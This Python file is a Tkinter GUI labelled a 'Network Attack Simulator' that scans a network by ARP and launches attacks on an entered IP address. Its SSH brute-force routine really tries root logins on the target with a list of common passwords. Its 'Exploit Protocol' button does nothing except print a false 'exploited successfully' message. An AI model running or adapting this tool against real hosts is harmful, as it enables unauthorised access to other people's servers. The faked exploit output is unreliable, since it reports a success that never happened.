import tkinter as tk
from tkinter import scrolledtext, messagebox
from scapy.all import ARP, Ether, srp
import paramiko
import threading

class NetworkAttackSimulator:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Attack Simulator")
        
        self.target_ip_label = tk.Label(root, text="Target IP:")
        self.target_ip_label.pack()
        self.target_ip_entry = tk.Entry(root, width=30)
        self.target_ip_entry.pack()

        self.result_text = scrolledtext.ScrolledText(root, width=60, height=20)
        self.result_text.pack()
        
        self.scan_button = tk.Button(root, text="Scan Network", command=self.scan_network)
        self.scan_button.pack()

        self.exploit_button = tk.Button(root, text="Exploit Protocol", command=self.exploit_protocol)
        self.exploit_button.pack()

        self.brute_force_button = tk.Button(root, text="Brute Force Attack", command=self.brute_force_attack)
        self.brute_force_button.pack()

    def scan_network(self):
        target_ip = self.target_ip_entry.get()
        self.result_text.insert(tk.END, f"Scanning network for IP: {target_ip}\n")
        
        def scan():
            arp = ARP(pdst=target_ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=3, verbose=0)[0]
            devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
            for device in devices:
                self.result_text.insert(tk.END, f"IP: {device['ip']}, MAC: {device['mac']}\n")
        
        threading.Thread(target=scan).start()

    def exploit_protocol(self):
        self.result_text.insert(tk.END, "Exploiting protocol...\n")
        # Dummy exploit simulation
        self.result_text.insert(tk.END, "Protocol exploited successfully!\n")

    def brute_force_attack(self):
        self.result_text.insert(tk.END, "Starting brute force attack...\n")
        
        def brute_force():
            target_ip = self.target_ip_entry.get()
            username = 'root'
            password_list = ['123456', 'password', 'admin']  # Simplified password list
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            for password in password_list:
                try:
                    ssh.connect(target_ip, username=username, password=password)
                    self.result_text.insert(tk.END, f"Brute force successful! Password: {password}\n")
                    return
                except paramiko.AuthenticationException:
                    self.result_text.insert(tk.END, f"Password {password} failed.\n")
            self.result_text.insert(tk.END, "Brute force attack failed.\n")
        
        threading.Thread(target=brute_force).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkAttackSimulator(root)
    root.mainloop()

